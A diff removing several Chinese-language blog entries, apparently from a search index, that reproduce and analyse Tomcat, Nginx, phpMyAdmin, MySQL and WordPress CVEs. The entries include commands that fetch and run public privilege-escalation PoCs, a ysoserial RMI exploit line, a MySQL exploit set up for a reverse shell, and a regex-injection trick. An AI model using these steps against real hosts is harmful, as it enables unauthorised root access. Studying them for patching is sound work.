@@ -1273,212 +1273,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2016-1240分析</title>
-    <url>/archives/29004be5.html</url>
-    <content><![CDATA[<p>针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。<br><a href="https://i.loli.net/2018/05/27/5b0ab46ce5759.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab46ce5759.png" alt="success.png"></a></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>获取<span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9Ub21jYXQtRGViUGtncy1Sb290LVByaXZpbGVnZS1Fc2NhbGF0aW9uLUV4cGxvaXQtQ1ZFLTIwMTYtMTI0MC5odG1s">POC脚本<i class="fa fa-external-link-alt"></i></span>，运行POC脚本。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/tomcat-rootprivesc-deb.sh /</span>var<span class="regexp">/log/</span>tomcat7/catalina.out</span><br></pre></td></tr></table></figure>
-<p><a href="https://i.loli.net/2018/05/27/5b0ab574c2c89.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab574c2c89.png" alt="run poc.png"></a><br>运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png" alt="run end.png"></a><br>重启Tomcat服务。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">serverce</span> tomcat<span class="number">7</span> restart</span><br></pre></td></tr></table></figure>
-<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>POC脚本85行判断用户是否为tomcat用户。<br><a href="https://i.loli.net/2018/05/27/5b0ab64865e90.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab64865e90.png" alt="1.png"></a><br>93行判断指定的tomcat日志文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656db9dd.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656db9dd.png" alt="2.png"></a><br>158行删除日志文件并软链接到/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab656de8a8.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656de8a8.png" alt="3.png"></a><br>168行判断/etc/ld.so.preload文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dff2c.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656dff2c.png" alt="4.png"></a><br>188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e13df.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656e13df.png" alt="5.png"></a><br>199行删除/etc/ld.so.preload和/tmp/privesclib.so。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e2b76.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656e2b76.png" alt="6.png"></a><br>跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png"><img data-src="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png" alt="7.png"></a></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Tomcat。</p>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2016-1247分析</title>
-    <url>/archives/eca7756b.html</url>
-    <content><![CDATA[<p>针对CVE-2016-1247漏洞进行复现、研究分析原理。<br><img data-src="https://i.loli.net/2018/05/27/5b0a99128c972.png" alt="success.png"></p>
-<a id="more"></a>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。</p>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a99a92f715.png" alt="id.png"><br>查看Nginx版本<code>dpkg -l | grep -i nginx</code><br><img data-src="https://i.loli.net/2018/05/27/5b0a99c78ea14.png" alt="nginx version.png"><br>下载poc脚本</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>legalhackers.com<span class="regexp">/exploits/</span>CVE-<span class="number">2016</span>-<span class="number">1247</span>/nginxed-root.sh</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/05/27/5b0a9b092c3ec.png" alt="wget.png"><br>修改poc权限,并执行poc</p>
-<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 nginxed-root.<span class="keyword">sh</span></span><br><span class="line">./nginxed-root.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/02/01/5a72bfed2d1c2.png" alt="run.png"><br>查看现在用户ID<br><img data-src="https://i.loli.net/2018/05/27/5b0a9bb689f58.png" alt="final id.png"></p>
-<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行<br><img data-src="https://i.loli.net/2018/02/01/5a72c0782bbd3.png" alt="www-data.png"><br>查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的<br><img data-src="https://i.loli.net/2018/02/01/5a72c08966ad5.png" alt="root.png"><br>根据POC进行利用分析，在145行使用dlsym获取euid<br>在147、148行修改/tmp/nginxrootsh文件的所有者和权限<br>在149行删除/etc/ld.so.preload文件<br><img data-src="https://i.loli.net/2018/02/01/5a72c0a10d21f.png" alt="code.png"><br>在154行编译生成的c文件，在其后判断是否编译成功<br><img data-src="https://i.loli.net/2018/02/01/5a72c0b003134.png" alt="make.png"><br>在162行将/bin/bash拷贝到/tmp/nginxrootsh<br><img data-src="https://i.loli.net/2018/02/01/5a72c0c48ba68.png" alt="copy.png"><br>在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0d7d17c2.png" alt="delete.png"><br>在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）<br><img data-src="https://i.loli.net/2018/02/01/5a72c0f12d27a.png" alt="copy.png"><br>在199行将/etc/ld.so.preload权限设置为755<br><img data-src="https://i.loli.net/2018/02/01/5a72c0ff840bc.png" alt="chmod.png"></p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。<br><img data-src="https://i.loli.net/2018/05/27/5b0a9c0b508d9.png" alt="root command.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Nginx版本。</p>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2016-5734分析</title>
-    <url>/archives/94f683da.html</url>
-    <content><![CDATA[<p>针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bad646bb23.png" alt="html.png"></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDAxODUv">下载<i class="fa fa-external-link-alt"></i></span>POC并执行即可。<br><img data-src="https://i.loli.net/2018/05/28/5b0bac6432b3e.png" alt="success.png"></p>
-<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。<br>跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42577df.png" alt="1.png"><br>在661行getReplacePreview函数调用了getRegexReplaceRows。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426791f.png" alt="2.png"><br>在613行findAction函数调用了getReplacePreview。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4266236.png" alt="3.png"><br>在175行indexAction函数调用了findAction，当searchType为replace调用findAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4264c4b.png" alt="4.png"><br>在/tbl_find_replace.php第33行调用indexAction。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf42622fe.png" alt="5.png"><br>根据以上可得知，调用getRegexReplaceRows函数的流程为：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">/tbl_find_replace.ph →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php indexAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php findAction() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php getReplacePreview() →</span><br><span class="line"><span class="regexp">/libraries/</span>controllers<span class="regexp">/table/</span>TableSearchController.php _getRegexReplaceRows()</span><br></pre></td></tr></table></figure>
-<p>当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf426366e.png" alt="6.png"><br>在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf4260f61.png" alt="7.png"><br>回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。<br><img data-src="https://i.loli.net/2018/05/28/5b0baf425f9e6.png" alt="8.png"><br>当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。</p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级phpMyAdmin。</p>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2016-6662分析</title>
-    <url>/archives/438a17c4.html</url>
-    <content><![CDATA[<p>针对MySQL Code Execution  Privilege Escalation进行漏洞复现并分析。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf1a7cd28e.png" alt="success.png"></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载<span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9NeVNRTC1FeHBsb2l0LVJlbW90ZS1Sb290LUNvZGUtRXhlY3V0aW9uLVByaXZlc2MtQ1ZFLTIwMTYtNjY2Mi5odG1s">cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c<i class="fa fa-external-link-alt"></i></span>，并放同一目录下（.so文件运行py时会自动生成）。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3652a5b4.png" alt="download.png"><br>修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf382985e0.png" alt="1.png"><br>运行py脚本。</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> cve-<span class="number">2016</span>-<span class="number">6662</span>_MySQL_RCE_exploit.<span class="keyword">py</span> -dbuser root -dbpass <span class="string">&#x27;&#x27;</span> -dbname pocdb -dbhost <span class="number">127.0</span>.<span class="number">0.1</span> -mycnf /etc/mysql/my.<span class="keyword">cnf</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/05/28/5b0bf3cae23f8.png" alt="2.png"><br>这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"><br>重启mysql服务，成功反弹shell。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"></p>
-<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。<br>跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6414a9a3.png" alt="safe mysql.png"><br>在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf65a91e1e.png" alt="my.cnf.png"><br>使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf69061dbd.png" alt="ps aux.png"><br>在my.cnf中写入malloc_lib加载so文件的路径。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6c216109.png" alt="malloc.png"><br>使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。<br><img data-src="https://i.loli.net/2018/05/28/5b0bf6de6ed35.png" alt="gcc.png"><br>配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。</p>
-<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><ol>
-<li>/etc/mysql/my.cnf权限设置：<img data-src="https://i.loli.net/2018/05/28/5b0bf47b43ac4.png" alt="1-1.png"><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chown mysql:root <span class="regexp">/etc/my</span>sql/my.cnf</span><br><span class="line">chmod <span class="number">600</span> <span class="regexp">/etc/my</span>sql/my.cnf</span><br></pre></td></tr></table></figure></li>
-<li>攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。<img data-src="https://i.loli.net/2018/05/28/5b0bf580c08c5.png" alt="2-2.png"><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p；</span><br><span class="line"><span class="keyword">use</span> pocdb;（攻击database的数据库名字）</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> poctable;</span><br></pre></td></tr></table></figure></li>
-<li>py脚本会自动运行nc，因此攻击服务器需要安装nc。</li>
-<li>如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。<img data-src="https://i.loli.net/2018/05/28/5b0bf5dd46899.png" alt="3-3.png"><img data-src="https://i.loli.net/2018/05/28/5b0bf604c841e.png" alt="4-4.png"><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&#x27;-dbport&#x27;</span>, <span class="attribute">dest</span>=<span class="string">&#x27;TARGET_PORT&#x27;</span>, <span class="attribute">required</span>=<span class="literal">True</span>, <span class="attribute">help</span>=<span class="string">&#x27;MySQL port&#x27;</span>) # 74行</span><br><span class="line">dbconn = mysql.connector.connect(<span class="attribute">user</span>=args.TARGET_USER, password =args.TARGET_PASS, <span class="attribute">database</span>=args.TARGET_DB, <span class="attribute">host</span>=args.TARGET_HOST, <span class="attribute">port</span>=args.TARGET_PORT) # 83行</span><br></pre></td></tr></table></figure>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1>升级MySQL。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2016-6663分析</title>
-    <url>/archives/e5fd1c70.html</url>
-    <content><![CDATA[<p>针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。<br><img data-src="https://i.loli.net/2018/05/29/5b0d484a0d66a.png" alt="success.png"></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看数据库版本:mysql -V。<br><img data-src="https://i.loli.net/2018/05/29/5b0d489f8ad05.png" alt="version.png"><br>建立低权限数据库用户，并新建库。<br><img data-src="https://i.loli.net/2018/05/29/5b0d48bf99c39.png" alt="user.png"><br><img data-src="https://i.loli.net/2018/05/29/5b0d48bf5c145.png" alt="db.png"><br><span class="exturl" data-url="aHR0cDovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9NeVNRTC1NYXJpYS1QZXJjb25hLVByaXZFc2NSYWNlLUNWRS0yMDE2LTY2NjMtNTYxNi1FeHBsb2l0Lmh0bWw=">下载CVE-2016-6663 POC<i class="fa fa-external-link-alt"></i></span>，并编译。<br><img data-src="https://i.loli.net/2018/05/29/5b0d490686b2d.png" alt="download poc.png"><br>查看当前用户id.<br><img data-src="https://i.loli.net/2018/05/29/5b0d491b8fad2.png" alt="user id.png"><br>运行CVE-2016-6663 POC。<br><img data-src="https://i.loli.net/2018/05/29/5b0d493ed9890.png" alt="run poc.png"><br>下载CVE-2016-6664 POC 并更改权限。<br><img data-src="https://i.loli.net/2018/05/29/5b0d495c31081.png" alt="run 2.png"><br>运行CVE-2016-6664 POC。</p>
-<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。<br><img data-src="https://i.loli.net/2018/05/29/5b0d497dafba7.png" alt="data.png"><br><img data-src="https://i.loli.net/2018/05/29/5b0d4996a0680.png" alt="directory.png"></p>
-<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>缺少mysql.h，安装libmysqlclient-dev。<br><img data-src="https://i.loli.net/2018/05/29/5b0d49c2a0e6a.png" alt="libmysqlclient-dev.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol>
-<li>升级MySQL；</li>
-<li>在my.cnf中添加：symbolic-links = 0。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2016-8735分析</title>
-    <url>/archives/c77f03de.html</url>
-    <content><![CDATA[<p>针对CVE-2016-8735复现并分析。<br><img data-src="https://i.loli.net/2018/05/30/5b0e433658076.png" alt="success.png"></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Tomcat启动JmxRemoteLifecycleListener监听器，在/conf/server.xml中添加<Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />Tomcat默认未开启JmxRemoteLifecycleListener监听器。在实际环境中，使用zabbix（是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案）通过JMX监控tomcat即会产生该漏洞环境。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp ysoserial-<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>-SNAPSHOT-<span class="literal">all</span>.jar ysoserial.exploit.RMIRegistryExploit localhost <span class="number">10001</span> Groovy<span class="number">1</span> calc.exe</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/05/30/5b0e43a478dc9.png" alt="command.png"></p>
-<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>根据攻击命令发现攻击函数为RMIRegistryExploit在ysoserial-0.0.5-SNAPSHOT-all.jar包中的ysoserial.exploit中。通过解压缩软件将RMIRegistryExploit从ysoserial-0.0.5-SNAPSHOT-all.jar解压出来。由于解压出来为class，对其进行反编译。<br><img data-src="https://i.loli.net/2018/05/30/5b0e440d9b0d7.png" alt="1.png"><br>第13行定义了RMIRegistryExploit类，第20行需传递一个数组，21行抛出Exception异常类型。<br><img data-src="https://i.loli.net/2018/05/30/5b0e442579ebc.png" alt="2.png"><br>第23行-25行定义了host为数组的第一位数值，port（int）为数组的第二位数值（通过Integer.parseInt将整形对象转换成int型），command为数组的第三位数值。<br><img data-src="https://i.loli.net/2018/05/30/5b0e443c27aed.png" alt="3.png"><br>在26行使用java.rmi.registry.LocateRegistry中的LocateRegistry.getRegistry方法来返回对Registry对象的引用。<img data-src="https://i.loli.net/2018/05/30/5b0e444fa93f7.png" alt="4.png"><br>在27行定义一个string 名字为className，通过StringBuilder创建一个新实例（结合后面代码中的append可发现用于快速进行字符相加），并获取CommonsCollections1的包的名字，最后把待执行的命令加上包的名字整体作为string赋值给className。28行获得该类(className)并初始化该类。<br><img data-src="https://i.loli.net/2018/05/30/5b0e4466de818.png" alt="5.png"><br>第29行执行exploit.warp，传递三个参数；第35行使用ExecCheckingSecurityManager的wrap并传一个对象，该对象包含三个参数（payloadClass、command、registry），跟踪ExecCheckingSecurityManager（ysoserial.secmgr.ExecCheckingSecurityManager）查看warp的作用（用于并发）。<br><img data-src="https://i.loli.net/2018/05/30/5b0e447fd6e8d.png" alt="6.png"><br>倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。<br><img data-src="https://i.loli.net/2018/05/30/5b0e449736dab.png" alt="7.png"><br>跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ad5b96b.png" alt="8.png"><br>第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ceb5e6d.png" alt="9.png"><br>倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。<br><img data-src="https://i.loli.net/2018/05/30/5b0e44ecea5c2.png" alt="10.png"><br>ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。<br>跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。<br><img data-src="https://i.loli.net/2018/05/30/5b0e450509c5f.png" alt="11.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol>
-<li>升级Tomcat</li>
-<li>改变JMX密码认证</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2017-5487分析</title>
-    <url>/archives/5a5cf5bb.html</url>
-    <content><![CDATA[<p>针对Content Injection Vulnerability in WordPress进行复现并分析。<br><img data-src="https://i.loli.net/2018/05/31/5b0f887805634.png" alt="success.png"></p>
-<a id="more"></a>
-<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>由于WordPress4.7.0-4.7.1REST API接口权限判断不合理导致命令注入。</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbGVvbmp6YS8yMjQ0ZWIxNTUxMGEwNjg3ZWQ5MzE2MGM2MjM3NjJhYg==">下载<i class="fa fa-external-link-alt"></i></span>POC脚本，运行即可。</p>
-<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。发现REST API在管理访问时，其会在正则表达式之前优先考虑$_GET和$_POST的值。例如: /wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。<br>在99行使用了update_item和update_item_permissions_check。<br><img data-src="https://i.loli.net/2018/05/31/5b0f89783224b.png" alt="1.png"><br>查看593行的update_item_permissions_check函数，其将ID值传递给get_post()函数。这个函数功能用来检查帖子是否存在、是否有权限。如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行update_item方法。<br><img data-src="https://i.loli.net/2018/05/31/5b0f899d3b8fa.png" alt="2.png"><br>由于使用get_instance()静态方法来获取post，造成get_post()在特定情况下无法找到对应的ID。<br>查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。<br><img data-src="https://i.loli.net/2018/05/31/5b0f89b300743.png" alt="3.png"><br>PHP语言中做类型的比较和转换时，其会返回整数。例如<br><img data-src="https://i.loli.net/2018/05/31/5b0f89c229bd3.png" alt="4.png"><br>例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。在流程进入权限检查时update_item_permissions_check判断其没有对应的post绕过权限判断，进行更新操作update_item。最终导致ID为456被修改。<br>在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。<br>修改前：<br><img data-src="https://i.loli.net/2018/05/31/5b0f89dc0e3d0.png" alt="5.png"><br>修改后：<br><img data-src="https://i.loli.net/2018/05/31/5b0f89edabed6.png" alt="6.png"></p>
-<h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>在复现时如果遇到id is not of type integer报错信息，有可能是因为版本不对。最新版本的4.7.2已经对该漏洞进行修复。<br><img data-src="https://i.loli.net/2018/05/31/5b0f8a0db7ddf.png" alt="11.png"><br><img data-src="https://i.loli.net/2018/05/31/5b0f8a19c8a8a.png" alt="12.png"></p>
-<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级WordPress至4.7.2及以上。</p>
-]]></content>
-      <categories>
-        <category>安全研究</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>weblogic wls9-async rce复现&amp;分析</title>
